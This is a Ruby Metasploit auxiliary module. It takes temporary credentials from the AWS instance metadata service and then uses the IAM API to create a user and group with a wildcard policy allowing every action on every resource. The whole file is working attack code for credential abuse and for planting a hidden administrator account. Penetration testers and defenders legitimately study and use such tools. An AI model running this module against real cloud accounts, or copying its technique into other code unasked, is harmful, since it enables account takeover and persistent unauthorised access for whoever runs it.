require 'msf/core'
require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Auxiliary

  include Metasploit::Framework::Aws::Client

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Create an AWS IAM User",
      'Description'    => %q{
        Creates an Amazon Web Services (AWS) Identity and Access Management (IAM) user with
        Admin privileges.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>']
    ))

    register_options(
      [
        OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),
        OptString.new('METADATA_PORT', [true, 'The metadata service TCP port', 80]),
        OptString.new('METADATA_SSL', [true, 'Metadata service SSL', false]),
        OptString.new('AWS_IAM_ENDPOINT', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
        OptString.new('AWS_IAM_ENDPOINT_PORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
        OptString.new('AWS_IAM_ENDPOINT_SSL', [true, 'AWS IAM Endpoint SSL', true]),
        OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*" }]}']),
        OptString.new('IAM_USERNAME', [true, 'Username for the user to be created', 'metasploit']),
        OptString.new('ACCESS_KEY', [false, 'AWS access key', '']),
        OptString.new('SECRET', [false, 'AWS secret key', '']),
        OptString.new('TOKEN', [false, 'AWS session token', '']),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ], self.class)
    deregister_options('RHOST', 'RPORT', 'SSL', 'VHOST')
  end


  def run
    # setup creds for making IAM API calls
    c = tmp_creds
    datastore['ACCESS_KEY'] = c.fetch('AccessKeyId', datastore['ACCESS_KEY'])
    datastore['SECRET'] = c.fetch('SecretAccessKey', datastore['SECRET'])
    datastore['TOKEN'] = c.fetch('Token', datastore['TOKEN'])
    datastore['RHOST'] = datastore['AWS_IAM_ENDPOINT']
    datastore['RPORT'] = datastore['AWS_IAM_ENDPOINT_PORT']
    datastore['SSL'] = datastore['AWS_IAM_ENDPOINT_SSL']
    username = datastore['IAM_USERNAME']
    print_status("Creating user: #{username}")
    doc = call_iam('Action' => 'CreateUser', 'UserName' => username)
    print_results(doc)
    print_status("Creating group: #{username}")
    doc = call_iam('Action' => 'CreateGroup', 'GroupName' => username)
    print_results(doc)
    pol_doc = datastore['IAM_GROUP_POL']
    call_iam('Action' => 'PutGroupPolicy', 'GroupName' => username, 'PolicyName' => username, 'PolicyDocument' => URI.encode(pol_doc))
  end

  def tmp_creds
    # setup http client required params
    datastore['RHOST'] = datastore['METADATA_IP']
    datastore['RPORT'] = datastore['METADATA_PORT']
    datastore['SSL'] = datastore['METADATA_SSL']
    # call to metadata service should not be proxied, it is always local
    proxies = datastore['Proxies']
    datastore['Proxies'] = nil
    creds = metadata_creds
    datastore['Proxies'] = proxies
    creds
  end
end